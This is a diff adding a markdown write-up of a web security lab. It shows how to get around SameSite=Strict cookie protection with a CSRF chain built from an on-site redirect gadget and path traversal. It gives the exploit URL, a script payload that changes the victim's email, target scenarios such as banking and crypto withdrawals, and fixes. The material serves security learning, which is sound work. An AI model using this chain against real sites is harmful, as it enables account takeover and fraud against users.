@@ -3258,3 +3258,495 @@ Server blocks GET
 ---
 
 Use GET to send cookies + `_method=POST` to execute action → bypass SameSite CSRF protection
+
+---
+
+# 🐞 Lab-8 — CSRF → SameSite=Strict Bypass via On-Site Redirect Gadget + Path Traversal
+
+---
+
+## 🔥 Overview (Full Theory + Insight)
+
+This lab demonstrates how **SameSite=Strict cookies (strong protection)** can still be bypassed using a **client-side redirect gadget** combined with **path traversal**.
+
+---
+
+Normally:
+
+```
+SameSite=Strict → blocks cookies in cross-site requests
+```
+
+---
+
+However, in this lab:
+
+✔ No CSRF token  
+✔ SameSite=Strict is enabled  
+✔ Client-side redirect exists  
+✔ Path traversal allows internal navigation  
+
+---
+
+👉 Attacker chains these to convert:
+
+```
+Cross-site request → Same-site request
+```
+
+---
+
+## 🧠 Core Idea
+
+SameSite protects entry point  
+Gadget allows internal pivot  
+
+---
+
+## 🧠 Key Exploit
+
+```
+/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker%40evil.com%26submit=1
+```
+
+---
+
+## 🔍 What Is This Topic?
+
+### 🔹 SameSite=Strict Bypass via On-Site Gadget
+
+Using a vulnerable redirect inside the application to execute actions as a same-site request
+
+---
+
+## 🧪 Lab Walkthrough (STEP-BY-STEP)
+
+---
+
+### 🧩 Step 1 — Capture Change Email Request
+
+```
+POST /my-account/change-email
+```
+
+---
+
+![no-csrf](../images/no-csrf-change-email.png)
+
+---
+
+### 🧠 Observation
+
+```
+No CSRF token present
+```
+
+---
+
+### 🧩 Step 2 — Check SameSite Cookie
+
+```
+Set-Cookie: session=XYZ; SameSite=Strict
+```
+
+---
+
+![samesite-strict](../images/samesite-strict-csrf-login-request.png)
+
+---
+
+### 🧠 Observation
+
+```
+Cookies blocked in cross-site requests
+```
+
+---
+
+### 🧩 Step 3 — Discover Redirect Behavior
+
+After posting a comment:
+
+```
+/post/comment/confirmation?postId=123
+```
+
+---
+
+![comment-confirmation](../images/comment-confirmation-redirect-url.png)
+
+---
+
+### 🧠 Observation
+
+```
+User redirected after comment
+```
+
+---
+
+### 🧩 Step 4 — Find JS Redirect Logic
+
+```
+GET /resources/js/commentConfirmationRedirect.js
+```
+
+---
+
+![js-file](../images/js-file.png)
+
+---
+
+### 🧠 Insight
+
+```
+redirect = "/post/" + postId
+```
+
+---
+
+👉 User controls redirect destination  
+
+---
+
+### 🧩 Step 5 — Test Path Traversal
+
+```
+/post/comment/confirmation?postId=1/../../my-account
+```
+
+---
+
+![path-traversal](../images/path-traversal-csrf.png)
+
+---
+
+### 🧠 Result
+
+```
+Redirects to /my-account
+```
+
+---
+
+👉 Internal endpoints reachable  
+
+---
+
+### 🧩 Step 6 — Confirm SameSite Bypass
+
+```
+<script>
+document.location = "https://LAB/post/comment/confirmation?postId=1/../../my-account";
+</script>
+```
+
+---
+
+👉 Flow:
+
+✔ First request → no cookies  
+✔ Second request → same-site → cookies included  
+
+---
+
+### 🧩 Step 7 — Test GET Request
+
+```
+GET /my-account/change-email?email=test@abc.com&submit=1
+```
+
+---
+
+👉 Result:
+
+✔ Accepted  
+
+---
+
+### 🧩 Step 8 — Final Payload
+
+```
+<script>
+document.location = "https://LAB/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacker%40evil.com%26submit=1";
+</script>
+```
+
+---
+
+### 🧩 Step 9 — Deliver Exploit
+
+```
+Victim loads page → chain executes
+```
+
+---
+
+👉 Result:
+
+✔ Email changed  
+✔ CSRF successful  
+
+---
+
+## 💣 Payload Breakdown
+
+---
+
+### 🔹 Outer Script
+
+```
+document.location = URL
+```
+
+---
+
+✔ Forces navigation  
+
+---
+
+### 🔹 First Request
+
+```
+/post/comment/confirmation?postId=...
+```
+
+---
+
+✔ Cross-site → no cookies  
+
+---
+
+### 🔹 Second Request (Redirect)
+
+```
+/my-account/change-email?email=...
+```
+
+---
+
+✔ Same-site → cookies included  
+
+---
+
+### 🔹 Path Traversal
+
+```
+../../
+```
+
+---
+
+✔ Escape intended path  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🔥 Scenario 1 — Banking
+
+```
+/transfer-money?amount=10000
+```
+
+---
+
+### 🔥 Scenario 2 — Account Takeover
+
+```
+change-email → reset password
+```
+
+---
+
+### 🔥 Scenario 3 — Crypto Apps
+
+```
+withdraw?wallet=attacker
+```
+
+---
+
+### 🔥 Scenario 4 — SaaS Admin
+
+```
+create-admin-user
+```
+
+---
+
+### 🔥 Scenario 5 — API Abuse
+
+```
+regenerate-api-key
+```
+
+---
+
+## ⚔️ Attack Chain
+
+---
+
+1️⃣ No CSRF token  
+2️⃣ SameSite=Strict present  
+3️⃣ Find redirect gadget  
+4️⃣ Control redirect param  
+5️⃣ Use path traversal  
+6️⃣ Reach internal endpoint  
+7️⃣ Trigger GET action  
+8️⃣ Cookies included  
+9️⃣ Action executed  
+
+---
+
+## 🎯 High-Value Endpoints
+
+---
+
+```
+/change-email
+/change-password
+/transfer-money
+/api-key/regenerate
+/admin/create-user
+```
+
+---
+
+## ⚠️ Real-World Limitations + Bypass
+
+---
+
+### ❌ No Redirect Gadget
+
+👉 Attack fails  
+
+---
+
+### ❌ Strict Path Validation
+
+👉 Traversal blocked  
+
+---
+
+### ❌ POST-only Endpoint
+
+👉 GET fails  
+
+---
+
+### ❌ CSRF Token Present
+
+👉 Request rejected  
+
+---
+
+### ✅ Bypass Ideas
+
+```
+Find alternate gadgets
+Chain with open redirect
+Combine with XSS
+```
+
+---
+
+## 🛡️ Remediation
+
+---
+
+### 🔴 Root Problem
+
+Server trusts same-site requests blindly  
+
+---
+
+### ✅ Fix 1 — Implement CSRF Tokens
+
+```
+Session-bound tokens
+```
+
+---
+
+### ✅ Fix 2 — Fix Redirect Logic
+
+```
+Use allowlist
+```
+
+---
+
+### ✅ Fix 3 — Prevent Path Traversal
+
+```
+Normalize input paths
+```
+
+---
+
+### ✅ Fix 4 — Enforce POST Only
+
+```
+Reject GET for sensitive actions
+```
+
+---
+
+### ✅ Fix 5 — Validate Origin / Referer
+
+```
+Block cross-site chains
+```
+
+---
+
+### ✅ Fix 6 — Do NOT rely on SameSite alone
+
+```
+Defense-in-depth required
+```
+
+---
+
+## 🧠 Mental Model
+
+---
+
+Step 1:
+
+```
+Enter site (no cookies)
+```
+
+---
+
+Step 2:
+
+```
+Redirect inside → cookies enabled
+```
+
+---
+
+## 🎯 Final Summary
+
+---
+
+✔ SameSite=Strict is bypassable  
+
+✔ On-site gadget acts as pivot  
+
+✔ Path traversal expands reach  
+
+✔ CSRF executed successfully  
+
+---
+
+## 🔥 Final One-Liner
+
+---
+
+Use on-site redirect + path traversal to convert cross-site request into same-site → cookies included → CSRF succeeds
